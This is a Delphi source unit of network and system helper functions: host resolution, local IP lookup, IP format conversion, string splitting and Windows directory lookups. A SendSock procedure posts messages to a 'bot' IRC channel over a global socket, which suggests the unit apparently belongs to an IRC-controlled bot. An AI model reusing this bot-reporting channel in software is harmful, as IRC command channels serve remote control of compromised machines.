unit stuff;

interface

Uses Classes;

function GetIPFromHost(const HostName: string): string;
function GetLongIp(s : String) : Cardinal;
Function GetShortIp(const s: int64): string;
Procedure SendSock(s:string);
function Resolve(const host: PChar;Var Ip:Longint): Boolean; // function for resolving host to ip
Function SpiltStr(S:String;Posx:integer):String;
Function StrCount(S:String):Integer;
function GetLocalIP: string;
Function Vise(i:cardinal):cardinal;
function GetProgramFilesDir: string;
function GetSysDir: string;

implementation

Uses Config,Winsock,errors,sysutils,WinInet,Windows,Registry,Main{$ifdef debug},logger{$endif};

function GetSysDir: string;
var
  dir: array [0..MAX_PATH] of Char;
begin
  GetSystemDirectory(dir, MAX_PATH);
  Result := StrPas(dir);
end;

function GetProgramFilesDir: string;
var
  reg: TRegistry;
begin
  reg := TRegistry.Create;
  try
    reg.RootKey := HKEY_LOCAL_MACHINE;
    reg.OpenKey('SOFTWARE\Microsoft\Windows\CurrentVersion', False);
    Result := reg.ReadString('ProgramFilesDir');
  finally
    reg.Free;
  end;
end;

function GetLocalIP: string;
var
  wsaData: TWSAData;
  addr: TSockAddrIn;
  Phe: PHostEnt;
  szHostName: array[0..128] of Char;
begin
  Result := '';
  if WSAStartup($101, WSAData) <> 0 then
    Exit;
  try
    if GetHostName(szHostName, 128) <> SOCKET_ERROR then
    begin
      Phe := GetHostByName(szHostName);
      if Assigned(Phe) then
      begin
        addr.sin_addr.S_addr := longint(plongint(Phe^.h_addr_list^)^);
        Result := inet_ntoa(addr.sin_addr);
      end;
    end;
  finally
    WSACleanup;
  end;
end;

function GetComputerNetName: string;
var
  buffer: array[0..255] of char;
  size: dword;
begin
  size := 256;
  if GetComputerName(buffer, size) then
    Result := '\\'+buffer
  else
    Result := ''
end;

Function IsInt(Str:String):Boolean;
  var i:int64;
begin
i:=StrToInt64Def(STR,-1);
if i = -1 then result:=false else result:=true;
end;

function GetIPFromHost(const HostName: string): string;
type
  TaPInAddr = array[0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
var
  phe: PHostEnt;
  pptr: PaPInAddr;
  i: Integer;
  GInitData: TWSAData;
begin
  WSAStartup($101, GInitData);
  Result := '';
  phe := GetHostByName(PChar(HostName));
  if phe = nil then Exit;
  pPtr := PaPInAddr(phe^.h_addr_list);
  i := 0;
  while pPtr^[i] <> nil do
  begin
    Result := inet_ntoa(pptr^[i]^);
    Inc(i);
  end;
  WSACleanup;
end;


Function StrCount(S:String):Integer;
  Var i:integer;
begin
i:=0;
while pos(' ',s) > 0 do
  begin
  inc(i);
  delete(s,pos(' ',s),1);
  end;
strcount:=i+1;
end;


Function SpiltStr(S:String;Posx:integer):String;
{* <HI Fuck You> *}
  Var i:integer;
      Q:integer;
begin
q:=StrCount(S);
if (q <> 0) and (posx <= q) then
  begin
  i:=1;
  while i <> posx do
    begin
    s:=copy(s,pos(' ',s)+1,length(s));
    inc(i);
    end;
  if pos(' ',s) > 0 then
    result:=copy(s,1,pos(' ',s)-1)
  else
    result:=s;
  end
else
  result:='';
end;

function Resolve; // function for resolving host to ip
var
  InAddr: TInAddr;
  HostEnt: PHostEnt;
begin
  Result:=True;
  InAddr.S_addr := inet_addr(host); // convert ip address format (ex: 127.0.0.1) to cardinal
  if InAddr.S_addr = INADDR_NONE then // if it is not a ip address then resolve it
  begin
    HostEnt := GetHostByName(host);
    if not Assigned(HostEnt) then // if couldn't resolve the host then exit
      begin
      //sendsock('[ERROR]: '+ER_005);
      Result:=False;
      end
    else
      Move((HostEnt^.h_addr_list^)^, InAddr.S_addr, HostEnt^.h_length); // move resolved host to InAddr.S_addr
  end;
  Ip := InAddr.S_addr;
end;

function GetLongIp(s : String) : Cardinal;
var
   r, i, c : Cardinal;
   p : LongInt;
   t : String;
begin
   GetLongIp := 0;
   r := 0;
   for i := 3 downto 0 do
   begin
      p := Pos('.', s);
      if p = 0 then p := Length(s) + 1;
      if p <= 1 then exit;
      t := Copy(s, 1, p - 1);
      Delete(s, 1, p);
      Val(t, p, c);
      if (c <> 0) or (p < 0) or (p > 255) then
      begin
        GetLongIp:=0;
        exit;
      end;
      r := r or cardinal(p) shl (i * 8);
   end;
   GetLongIp := r;
end;

Function Vise(i:cardinal):cardinal;
begin
result:=(i and $000000FF) * $FFFFFF + (i and $000000FF) +
       (i AND $0000FF00) SHR 8 * $FFFF + (i AND $0000FF00) SHR 8 +
       (i AND $00FF0000) SHR 16 * $FF     + (i AND $00FF0000) SHR 16 +
       (i AND $FF000000) SHR 24;
end;

Function GetShortIp;
Var a, b, c, d : Byte;
Begin
        a := (S AND $FF000000) SHR 24;
        b := (S AND $00FF0000) SHR 16;
        c := (S AND $0000FF00) SHR 8;
        d := (S AND $000000FF);
        GetShortIp := inttostr(a) + '.' + inttostr(b) + '.' + inttostr(c) + '.' + inttostr(d);
End;

Procedure SendSock(s:string);
var
  str01:string;
begin
str01:=('PRIVMSG '+ Data.bot_channal + ' :'+s+  #10#13);
{$ifdef debug}
  logger.AddToMessageLog('[DEBUG] ' + S);
{$endif}
send(Sock1,str01[1],Length(str01),0);
end;

end.
